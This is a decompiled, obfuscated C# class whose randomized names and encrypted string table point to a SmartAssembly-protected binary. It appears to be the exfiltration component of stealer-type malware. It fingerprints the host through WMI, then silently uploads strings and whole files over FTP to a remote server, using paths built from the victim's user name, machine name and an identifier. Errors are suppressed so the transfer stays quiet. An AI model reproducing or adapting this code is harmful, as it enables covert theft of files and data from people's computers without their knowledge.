using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace igelRrgoft;

internal sealed class IoVTZTUGdmDX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string lOkUlDnVqGkweRha()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107406875));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107406886)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107406837);
			ManagementObject val3 = new ManagementObject(getString_0(107406864) + text + getString_0(107406823));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107406818)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107392705);
		}
	}

	public static void SylkEqngRAyQdU(string yAWWnaiTzBMtXQ = "URL", string OCZSjwDrOclyy = "USERNAME", string nJsyqQlSOEI = "ACCESO", string dtlEJryfgh = "")
	{
		try
		{
			string text = lOkUlDnVqGkweRha();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(yAWWnaiTzBMtXQ + getString_0(107407173) + Environment.UserName + getString_0(107407128) + Environment.MachineName + getString_0(107407139) + text + getString_0(107407102));
			ftpWebRequest.Method = getString_0(107406793);
			ftpWebRequest.Credentials = new NetworkCredential(OCZSjwDrOclyy, nJsyqQlSOEI);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(dtlEJryfgh);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void irIbESpHjMem(string YcglJarqnCHCAX = "URL", string ipndPfWmtwlcVPB = "USERNAME", string SkUfPeMNRZAk = "ACCESO", string eLkyBkPTPaGVQ = "")
	{
		try
		{
			string text = lOkUlDnVqGkweRha();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(YcglJarqnCHCAX + getString_0(107407173) + Environment.UserName + getString_0(107407128) + Environment.MachineName + getString_0(107407139) + text + getString_0(107407139) + Path.GetFileName(eLkyBkPTPaGVQ));
			ftpWebRequest.Method = getString_0(107406793);
			ftpWebRequest.Credentials = new NetworkCredential(ipndPfWmtwlcVPB, SkUfPeMNRZAk);
			byte[] array = File.ReadAllBytes(eLkyBkPTPaGVQ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static IoVTZTUGdmDX()
	{
		Strings.CreateGetStringDelegate(typeof(IoVTZTUGdmDX));
	}
}
